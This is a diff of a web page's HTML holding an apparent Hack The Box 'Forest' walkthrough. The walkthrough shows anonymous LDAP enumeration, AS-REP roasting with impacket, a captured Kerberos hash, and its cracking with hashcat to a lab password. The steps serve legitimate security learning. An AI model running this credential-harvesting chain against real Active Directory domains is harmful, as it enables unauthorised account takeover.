@@ -38,7 +38,6 @@
     &lt;a href=&#34;#footholduser&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Q1: For which domain is this machine a Domain Controller?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q1-for-which-domain-is-this-machine-a-domain-controller&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q1-for-which-domain-is-this-machine-a-domain-controller&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Ran port scan with nmap:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat nmap/initial.nmap &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -49,13 +48,10 @@
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210
 Nmap scan report for 10.129.95.210
 Host is up (0.17s latency).
 Scanned at 2024-07-25 17:11:19 -03 for 513s
@@ -105,7 +101,7 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+# Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -114,14 +110,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;strong&gt;R1: htb.local&lt;/strong&gt;&lt;/p&gt;
 &lt;h3&gt;Q2: Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q2-which-of-the-following-services-allows-for-anonymous-authentication-and-can-provide-us-with-valuable-information-about-the-machine-ftp-ldap-smb-winrm&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q2-which-of-the-following-services-allows-for-anonymous-authentication-and-can-provide-us-with-valuable-information-about-the-machine-ftp-ldap-smb-winrm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Attempting SMB&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbclient -L 10.129.95.210 -U guest&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -132,14 +125,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;Password for [WORKGROUP\guest]:
-session setup failed: NT_STATUS_ACCOUNT_DISABLED&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Password for [WORKGROUP\guest]:
+session setup failed: NT_STATUS_ACCOUNT_DISABLED&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -148,12 +138,9 @@ session setup failed: NT_STATUS_ACCOUNT_DISABLED&lt;/code&gt;&lt;/pre&gt;&lt;div
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Attempting LDAP&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -H ldap://10.129.36.185:389/ -x -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc=htb,dc=local&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(objectClass=*)&amp;#34;&lt;/span&gt; *&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -164,13 +151,10 @@ session setup failed: NT_STATUS_ACCOUNT_DISABLED&lt;/code&gt;&lt;/pre&gt;&lt;div
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;# extended LDIF
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;# extended LDIF
 #
 # LDAPv3
 # base &amp;lt;dc=htb,dc=local&amp;gt; with scope subtree
@@ -192,7 +176,7 @@ dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
 
 # Read-only Domain Controllers, Users, htb.local
 
-...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -201,14 +185,11 @@ dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;strong&gt;R2: LDAP&lt;/strong&gt;&lt;/p&gt;
 &lt;h3&gt;Q3: Which user has Kerberos Pre-Authentication disabled?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q3-which-user-has-kerberos-pre-authentication-disabled&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q3-which-user-has-kerberos-pre-authentication-disabled&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Took a while to craft this query:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -H ldap://10.129.36.185:389/ -x -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ou=Employees,dc=htb,dc=local&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(&amp;amp;(objectClass=user)(objectClass=person))&amp;#34;&lt;/span&gt; +&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -219,13 +200,10 @@ dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;# extended LDIF
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;# extended LDIF
 #
 # LDAPv3
 # base &amp;lt;ou=Employees,dc=htb,dc=local&amp;gt; with scope subtree
@@ -259,7 +237,7 @@ search: 2
 result: 0 Success
 
 # numResponses: 6
-# numEntries: 5&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+# numEntries: 5&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -268,12 +246,9 @@ result: 0 Success
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;After that, I also tried many other ldapsearch queries in order to find the right user, but only managed to do so by running enum4linux later, with all basic enumeration. Here is the one I thought would be the most promising:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -H ldap://10.129.36.185:389/ -x -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc=htb,dc=local&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(objectClass=user)&amp;#34;&lt;/span&gt;| grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sAMAccountName: &amp;#34;&lt;/span&gt; | sed s/&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sAMAccountName: &amp;#34;&lt;/span&gt;//g | cat -n&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -284,13 +259,10 @@ result: 0 Success
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;     1  Guest
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;     1  Guest
      2  DefaultAccount
      3  FOREST$
      4  EXCH01$
@@ -319,7 +291,7 @@ result: 0 Success
     27  lucinda
     28  andy
     29  mark
-    30  santi&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+    30  santi&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -328,13 +300,10 @@ result: 0 Success
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;However, when trying to run &lt;code&gt;impacket-GetNPUsers&lt;/code&gt; with those usernames, it&amp;rsquo;s output stated that none of the accounts had the &lt;code&gt;UF_DONT_REQUIRE_PREAUTH&lt;/code&gt; property set.&lt;/p&gt;
 &lt;p&gt;Then I tried enum4linux:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ enum4linux -a 10.129.95.210 | tee enum4linux.out&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -345,8 +314,6 @@ result: 0 Success
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Why didn&amp;rsquo;t I find that user in any of my &lt;code&gt;ldapsearch&lt;/code&gt; queries?&lt;/p&gt;
@@ -354,7 +321,6 @@ result: 0 Success
 &lt;p&gt;&lt;img src=&#34;image-2.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Following with my solve, I included that username in my list and tried running the impacket script again.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ impacket-GetNPUsers htb.local/ -dc-ip 10.129.36.185 -outputfile hash.txt -format hashcat -usersfile usernames-custom.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -365,13 +331,10 @@ result: 0 Success
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
@@ -403,7 +366,7 @@ result: 0 Success
 [-] User andy doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
 [-] User mark doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
 [-] User santi doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc37b84a525e6761682e354a1d4c13e10db57d41d194e13301528c48b687200a8e00d7f6e0c117d54c7034502075391ba970b0dce19868c6a0c9d2d9ddceb96c051955d3e168b198e9021f9f0b2132be9dcd46fb1b90edd2e7f40cb091ae8f0c7c833807621948aa3a7cfa9e6f2f078203f3bb2cbab21585d42655753259a0e5aa1245dab21b363e9e9fd3f1fad5919b09e4f9065a458a7b9df001af31681d01d15f220e02d4f2f69efb1cb41eb0ec63e4b749bdb1e30fa710ea2a159a603e69cd990fa1bc29eae7e08fd8cf91ac02f03793028b1bae9814571efa251e829371f327&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc37b84a525e6761682e354a1d4c13e10db57d41d194e13301528c48b687200a8e00d7f6e0c117d54c7034502075391ba970b0dce19868c6a0c9d2d9ddceb96c051955d3e168b198e9021f9f0b2132be9dcd46fb1b90edd2e7f40cb091ae8f0c7c833807621948aa3a7cfa9e6f2f078203f3bb2cbab21585d42655753259a0e5aa1245dab21b363e9e9fd3f1fad5919b09e4f9065a458a7b9df001af31681d01d15f220e02d4f2f69efb1cb41eb0ec63e4b749bdb1e30fa710ea2a159a603e69cd990fa1bc29eae7e08fd8cf91ac02f03793028b1bae9814571efa251e829371f327&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -412,15 +375,12 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;By that output, we can notice that many of the usernames could&amp;rsquo;ve been excluded from my list.&lt;/p&gt;
 &lt;p&gt;This technique is known as AS-REP Roasting.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R3: svc-alfresco&lt;/strong&gt;&lt;/p&gt;
 &lt;h3&gt;Q4: What is the password of the user svc-alfresco?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q4-what-is-the-password-of-the-user-svc-alfresco&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q4-what-is-the-password-of-the-user-svc-alfresco&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; hash.txt /usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -431,15 +391,12 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-3.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R4: s3rvice&lt;/strong&gt;&lt;/p&gt;
 &lt;h3&gt;Q5: To what port can we connect with these creds to get an interactive shell?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q5-to-what-port-can-we-connect-with-these-creds-to-get-an-interactive-shell&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q5-to-what-port-can-we-connect-with-these-creds-to-get-an-interactive-shell&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As I wasn&amp;rsquo;t sure if any of the ports I&amp;rsquo;d found in the initial nmap scan could be hosting some kind of remote shell service, I decided to run another one through all of the TCP ports in the host.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat nmap/complete.nmap&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -450,13 +407,10 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Tue Jul 30 00:38:14 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.36.185
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Tue Jul 30 00:38:14 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.36.185
